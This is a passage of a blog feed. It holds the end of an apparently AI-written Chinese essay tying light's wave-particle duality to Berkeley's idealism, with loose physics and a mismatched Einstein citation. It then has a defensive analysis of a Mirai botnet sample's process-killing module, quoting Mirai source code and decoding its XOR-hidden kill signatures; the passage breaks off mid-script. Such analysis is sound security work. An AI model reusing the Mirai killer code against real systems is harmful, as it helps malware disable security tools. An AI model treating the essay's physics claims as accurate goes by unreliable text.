对理解现实本质的影响</h3><p>光的波粒二象性理论和存在即被感知理论都对我们对现实的理解具有重要意义。光的波粒二象性理论表明，物体的性质可能取决于观察它的方式，而客观世界可能并不总是它看起来的样子。这导致了对光的性质和量子世界的新思考方式，并且是量子力学发展的主要贡献者。</p><p>另一方面，存在即被感知理论暗示现实完全是主观的，客观世界是心灵创造的幻觉。虽然这个想法可能看起来很激进，但它已经引发了关于现实本质的重要问题，并激发了对感知、现实和心灵之间关系的进一步哲学探究。</p><p>总而言之，虽然光的波粒二象性理论与存在即被感知理论存在重要差异，但它们之间存在联系，因为它们证明了物体的性质取决于观察方式。这些理论对我们理解现实具有重要意义，并且它们仍然是科学家、哲学家和寻求更好地了解周围世界的个人的重要研究领域。</p><h2 id="两种理论之间的联系"><a class="markdownIt-Anchor" href="#两种理论之间的联系"></a> 两种理论之间的联系</h2><h3 id="光的波粒二象性理论与存在即被感知理论的关系分析"><a class="markdownIt-Anchor" href="#光的波粒二象性理论与存在即被感知理论的关系分析"></a> 光的波粒二象性理论与存在即被感知理论的关系分析</h3><p>光的波粒二象性理论和存在即被感知理论是两个看似截然不同的理论，但在探索现实本质的过程中却有着共同点。这两种理论都试图理解被观察者与观察者之间的关系，以及这种关系如何塑造我们对周围世界的理解。光的波粒二象性理论表明，光如何根据观察方式表现出波和粒子的特性，而存在即被感知理论断言，我们所经历的现实是由我们感知它的方式塑造的。</p><p>光的波粒二象性理论源于早期的光和物质实验，例如双缝实验。这个实验表明，当光以波的形式被观察到时，它可以穿过两个狭缝，并在狭缝后面的屏幕上产生干涉图样。然而，当光以粒子的形式被观察时，它一次只通过一个狭缝，并没有产生干涉图样。这个实验表明，光的性质会随着观察方式的不同而发生变化。</p><p>同样，存在即被感知理论表明我们对现实的理解是由我们感知它的方式决定的。该理论断言，我们所经历的世界不是独立于我们的感知而存在的客观现实，而是由我们的感知和与世界的相互作用所创造的主观现实。从这个意义上说，我们所经历的现实是我们思想以及我们如何处理来自周围世界的信息的产物。</p><h3 id="讨论联系对我们理解现实的影响"><a class="markdownIt-Anchor" href="#讨论联系对我们理解现实的影响"></a> 讨论联系对我们理解现实的影响</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义。它表明现实的本质可能比我们之前想象的更加复杂和难以捉摸。光的波粒二象性理论表明，光的特性可以根据观察方式而改变，而存在即被感知理论表明，我们体验到的现实是由我们感知它的方式塑造的。</p><p>这些理论共同表明，我们对现实的理解可能会受到我们观察和感知周围世界的方式的限制。这对科学研究具有重要意义，因为它表明我们的实验和测量可能会受到我们观察和感知世界的方式的限制。这也对我们理解主观体验以及感知在塑造我们的现实中所起的作用有影响。</p><h3 id="探索对其他研究领域的可能联系和影响"><a class="markdownIt-Anchor" href="#探索对其他研究领域的可能联系和影响"></a> 探索对其他研究领域的可能联系和影响</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系也对其他研究领域具有潜在影响。例如，它可能对量子物理学领域有影响，该领域与理解亚原子粒子的行为有关。光的波粒二象性理论和存在即被感知理论都表明，我们对现实的理解可能会受到我们观察和感知世界的方式的影响，这可能对我们对量子世界的理解产生影响。</p><p>此外，这两种理论之间的联系可能对心理学领域和知觉研究产生影响。存在即被感知理论表明，我们的感知在塑造我们的现实中起着重要作用，这可能对我们理解感知如何影响我们的行为和思维过程有影响。</p><p>总的来说，光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义，并有可能影响许多研究领域。对这种联系的进一步研究可能会提供对现实本质的更深入见解，并帮助我们更好地理解观察和感知在塑造我们对周围世界的理解方面所起的作用。</p><p>值得注意的是，这些理论仍处于发展的早期阶段，关于光的波粒二象性理论与存在即被感知理论之间的联系，仍有许多有待探索和理解。然而，这种联系的潜在影响是令人兴奋的，并且有可能以深刻的方式塑造我们对现实的理解。</p><p>总之，光的波粒二象性理论与存在即被感知理论之间的联系是一个复杂而有趣的研究领域，对我们对现实的理解具有重要意义。对这种联系的进一步研究有可能揭示现实的本质以及它是如何通过观察和感知形成的。</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><h3 id="主要发现和结论总结"><a class="markdownIt-Anchor" href="#主要发现和结论总结"></a> 主要发现和结论总结</h3><p>在本论文中，我们分析了光的波粒二象性理论与存在即被感知理论之间的联系。我们首先介绍了光的波粒二象性理论，即当以波的形式观察光时，它会表现出波的性质，而当以粒子的形式观察光时，它会表现出类粒子的性质。这种对偶性理论已得到广泛研究，并得到大量实验和论证的支持。</p><p>然后我们转向存在即被感知理论，这是一种哲学理论，表明物体的存在和属性取决于观察者对它们的感知。该理论还强调了观察者与被观察者之间的相互联系，表明现实的本质是主观的和相对的。</p><p>我们的分析表明，这两种理论之间存在重要联系，特别是在它们对理解现实本质的影响方面。光的波粒二象性理论强调了一个事实，即光的性质取决于它如何被观察到，而存在即被感知理论则强调了物体对观察的依赖性。这两个理论共同表明，现实的本质是相对的，依赖于观察，我们感知的世界是我们主观经验的产物。</p><h3 id="未来研究方向的讨论"><a class="markdownIt-Anchor" href="#未来研究方向的讨论"></a> 未来研究方向的讨论</h3><p>本研究初步检验了这两种理论之间的联系，还有很大的研究空间。未来研究的一个方向可能是探索光的波粒二象性理论与其他物理学领域（如量子力学）之间的可能联系。这将提供对现实本质和我们感知的局限性的更深入理解。</p><p>另一个研究领域可能是探索这两种理论之间的联系对我们理解意识的影响。存在即被感知理论表明现实是主观的，物体及其属性取决于观察。这对我们理解意识的本质以及它如何影响我们对世界的看法具有重要意义。</p><p>最后，未来的研究可以侧重于检验这两种理论与其他哲学理论（如唯心主义、现实主义和唯我论）之间的联系。这将提供对现实的本质和我们感知的局限性的全面检查。</p><h3 id="关于两种理论联系意义的最后思考"><a class="markdownIt-Anchor" href="#关于两种理论联系意义的最后思考"></a> 关于两种理论联系意义的最后思考</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系凸显了我们感知的局限性和现实的主观性。它表明我们所经历的世界是我们主观体验的产物，而物体的属性取决于它们是如何被观察到的。</p><p>这种联系对我们理解现实、意识的本质和我们感知的局限性具有重要意义。它挑战我们重新考虑我们对世界的看法和信念的基础，并质疑现实的客观本质。</p><p>总之，光的波粒二象性理论与存在即被感知理论之间的联系为进一步探索和更深入地理解现实的本质和我们感知的局限性提供了宝贵的机会。</p><h2 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> 参考文献</h2><ol><li>Einstein, A. (1905). On the Electrodynamics of Moving Bodies. Annalen der Physik, 17(10), 891-921.</li><li>de Broglie, L. (1924). Waves and quanta. The London, Edinburgh, and Dublin Philosophical Magazine and Journal of Science, 47(281), 446-453.</li><li>Schrödinger, E. (1926). An Undulatory Theory of the Mechanics of Atoms and Molecules. Physical Review, 28(6), 1049-1070.</li><li>Heisenberg, W. (1927). Über den anschaulichen Inhalt der quantentheoretischen Kinematik und Mechanik. Zeitschrift für Physik, 43(3-4), 172-198.</li><li>Born, M. (1926). Über die quantentheoretische Deutung kinematischer und mechanischer Beziehungen. Zeitschrift für Physik, 37(12), 863-867.</li><li>Feynman, R. P., Leighton, R. B., &amp; Sands, M. (2011). The Feynman lectures on physics. Pearson Education.</li><li>Mermin, N. D. (1985). Is the moon there when nobody looks? Reality and the quantum theory. Physics Today, 38(4), 38-47.</li><li>Bohm, D. (1952). A Suggested Interpretation of the Quantum Theory in Terms of “Hidden” Variables, I. Physical Review, 85(2), 166-193.</li><li>Bohm, D., &amp; Hiley, B. J. (1993). The Undivided Universe: An Ontological Interpretation of Quantum Theory. Routledge.</li><li>Husserl, E. (1913). Ideas: General Introduction to Pure Phenomenology. Routledge.</li><li>Berkeley, G. (1710). A Treatise Concerning the Principles of Human Knowledge. Oxford University Press.</li></ol><h2 id="致谢"><a class="markdownIt-Anchor" href="#致谢"></a> 致谢</h2><p>我要感谢所有在本文完成期间支持我的人。我要感谢我的主管[Chatgpt]在整个过程中的指导和支持。我还要感谢为我提供完成研究所需资源的图书馆和学术机构。</p><p>我要感谢所有帮助形成本文讨论的理论的科学家和哲学家的贡献。他们的工作为我的研究奠定了基础，我很感谢他们的见解和发现。</p><p>最后，我要感谢我的家人和朋友在整个项目过程中坚定不移的支持和鼓励。没有他们的爱与支持，就不可能有这篇论文。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简介&quot;&gt;&lt;/a&gt; 简介&lt;/h2&gt;
&lt;h3 id=&quot;光的波粒二象性理论与存在即被感知理论概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#光的波粒二象性理论与存在即被感知理论概述&quot;&gt;&lt;/a&gt; 光的波粒二象性理论与存在即被感知理论概述&lt;/h3&gt;
&lt;p&gt;光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。&lt;/p&gt;
&lt;h3 id=&quot;研究目的及意义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#研究目的及意义&quot;&gt;&lt;/a&gt; 研究目的及意义&lt;/h3&gt;
&lt;p&gt;本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。&lt;/p&gt;
&lt;p&gt;这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。&lt;/p&gt;
&lt;p&gt;除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。&lt;/p&gt;
&lt;p&gt;总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
  <entry>
    <title>Mirai恶意样本KILL进程特征提取</title>
    <link href="https://yoloyolo.top/2022/06/14/Mirai-KILL-KEY/"/>
    <id>https://yoloyolo.top/2022/06/14/Mirai-KILL-KEY/</id>
    <published>2022-06-14T11:38:41.000Z</published>
    <updated>2022-06-14T12:13:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>上班的时候被安排了个分析恶意样本的活<br />说是这个恶意样本会选择性地KILL进程，把公司开发的HIDS给KILL了<br />让我分析一下这个恶意样本的KILL机制以及KILL特征<br /><s>WEB手，但是干的或是恶意样本分析</s></p><a id="more"></a><h1 id="跑着玩玩"><a class="markdownIt-Anchor" href="#跑着玩玩"></a> 跑着玩玩</h1><p>在虚拟机里运行这个恶意样本，给我物理机整没网了<br />公司网总共1MB/s的带宽<s>下个炉石下半天</s>全给你占了是吧（流汗黄豆）</p><p>sysdig看一下这个恶意样本进程的读写操作<br />一直在读取<code>/proc/self/exe</code><br />看着看着就觉得不对劲了，这读的不是sysdig的help信息么<br />大概理一下思路，这玩意应该是遍历<code>/proc/$pid/exe</code>，然后读取内容<br />至于KILL特征，没思路</p><h1 id="re-searcher"><a class="markdownIt-Anchor" href="#re-searcher"></a> re-searcher</h1><p>根据前几次恶意样本分析的经验，在google上搜一下这个恶意样本的SHA256就能知道名字<br />搜一下名字就能找到相关报告<br />上传到一个在线杀箱看恶意样本的活动<br />结合别人的分析报告就差不多了</p><p>然后就找到了这篇文章<br /><a href="https://paper.seebug.org/142/?utm_source=tuicool&amp;utm_medium=referral#21-payload">Mirai 源码分析</a><br />这篇文章提到了部分特征，但是样本应该跟我手头上的不一样，所以还是得自己分析<br /><a href="https://github.com/jgamblin/Mirai-Source-Code">Mirai源码</a></p><h1 id="source-code"><a class="markdownIt-Anchor" href="#source-code"></a> source code</h1><p>先看<code>kill.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (memory_scan_match(exe_path))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[killer] Memory scan match for binary %s\n&quot;</span>, exe_path);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">kill(pid, <span class="number">9</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>差不多就是这段代码了<br />至于<code>exe_path</code>，有这么一段注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Store &#x2F;proc&#x2F;$pid&#x2F;exe into exe_path</span><br></pre></td></tr></table></figure><p>然后就看看下面两个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">memory_scan_match</span><span class="params">(<span class="keyword">char</span> *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, ret;</span><br><span class="line">    <span class="keyword">char</span> rdbuf[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">char</span> *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard;</span><br><span class="line">    <span class="keyword">int</span> m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len;</span><br><span class="line">    BOOL found = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fd = open(path, O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    table_unlock_val(TABLE_MEM_QBOT);</span><br><span class="line">    table_unlock_val(TABLE_MEM_QBOT2);</span><br><span class="line">    table_unlock_val(TABLE_MEM_QBOT3);</span><br><span class="line">    table_unlock_val(TABLE_MEM_UPX);</span><br><span class="line">    table_unlock_val(TABLE_MEM_ZOLLARD);</span><br><span class="line"></span><br><span class="line">    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &amp;m_qbot_len);</span><br><span class="line">    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &amp;m_qbot2_len);</span><br><span class="line">    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &amp;m_qbot3_len);</span><br><span class="line">    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &amp;m_upx_len);</span><br><span class="line">    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &amp;m_zollard_len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((ret = read(fd, rdbuf, <span class="keyword">sizeof</span> (rdbuf))) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))</span><br><span class="line">        &#123;</span><br><span class="line">            found = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    table_lock_val(TABLE_MEM_QBOT);</span><br><span class="line">    table_lock_val(TABLE_MEM_QBOT2);</span><br><span class="line">    table_lock_val(TABLE_MEM_QBOT3);</span><br><span class="line">    table_lock_val(TABLE_MEM_UPX);</span><br><span class="line">    table_lock_val(TABLE_MEM_ZOLLARD);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> found;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">mem_exists</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> buf_len, <span class="keyword">char</span> *str, <span class="keyword">int</span> str_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> matches = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str_len &gt; buf_len)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (buf_len--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*buf++ == str[matches])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (++matches == str_len)</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            matches = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>memory_scan_match</code>用于在<code>/proc/$pid/exe</code>中查找特征<br />函数<code>mem_exists</code>是查找功能的具体实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m_qbot_report</span><br><span class="line">m_qbot_http</span><br><span class="line">m_qbot_dup</span><br><span class="line">m_upx_str</span><br><span class="line">m_zollard</span><br></pre></td></tr></table></figure><p>这五个变量就是特征</p><p>这五个变量又来自于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TABLE_MEM_QBOT</span><br><span class="line">TABLE_MEM_QBOT2</span><br><span class="line">TABLE_MEM_QBOT3</span><br><span class="line">TABLE_MEM_UPX</span><br><span class="line">TABLE_MEM_ZOLLARD</span><br></pre></td></tr></table></figure><p>然后这五个变量又来自于<code>table.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add_entry(TABLE_MEM_QBOT, <span class="string">&quot;\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22&quot;</span>, <span class="number">13</span>);</span><br><span class="line">add_entry(TABLE_MEM_QBOT2, <span class="string">&quot;\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22&quot;</span>, <span class="number">10</span>);</span><br><span class="line">add_entry(TABLE_MEM_QBOT3, <span class="string">&quot;\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22&quot;</span>, <span class="number">10</span>);</span><br><span class="line">add_entry(TABLE_MEM_UPX, <span class="string">&quot;\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22&quot;</span>, <span class="number">33</span>);</span><br><span class="line">add_entry(TABLE_MEM_ZOLLARD, <span class="string">&quot;\x58\x4D\x4E\x4E\x43\x50\x46\x22&quot;</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>看样子是加密的<br />但是下面看到了一个很简单的加解密函数<br />大概意思是<code>m ^ 0x22 = c</code><br />解密脚本以及输出如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cipher = [</span><br><span class="line"><span class="string">&quot;\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x58\x4D\x4E\x4E\x43\x50\x46\x22&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> cipher:</span><br><span class="line">str_tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> __ <span class="keyword">in</span> _:</span><br><span class="line">char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(__) ^ <span class="number">0x22</span>)</span><br><span class="line"><span class="keyword">if</span> char == <span class="string">&quot;\0&quot;</span>:</span><br><span class="line">char = <span class="string">&quot;\\x00&quot;</span></span><br><span class="line">str_tmp = str_tmp + char</span><br><span class="line">print(str_tmp)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">REPORT %s:%s\x00</span></span><br><span class="line"><span class="string">HTTPFLOOD\x00</span></span><br><span class="line"><span class="string">LOLNOGTFO\x00</span></span><br><span class="line"><span class="string">\x58\x4D\x4E\x4E\x43\x50\x46\x22\x00</span></span><br><span class="line"><span class="string">zollard\x00</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>所以这个就和之前的分析报告对得上了，那本地的样本特征又该咋整呢？</p><h1 id="ida"><a class="markdownIt-Anchor" href="#ida"></a> ida</h1><p>strings窗口找字符串<br />找到一些看起来是加密的数据<br />程序初始内存为<code>0x08048000</code>，数据存储开始于<code>0x08058C60</code>，偏移量为<code>0x010c60</code>，数据存储结束于<code>0x08059637</code>，数据长度为<code>0x09d8</code><br />取出数据异或<code>0x22</code>得到明文<br />那么问题来了，这玩意该怎么和表中的每一项数据对应起来</p><p>函数<code>sub_8054D10</code>调用了这部分数据<br />取数据的下标和长度，对解密的字符串进行拆分即可<br />脚本如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span 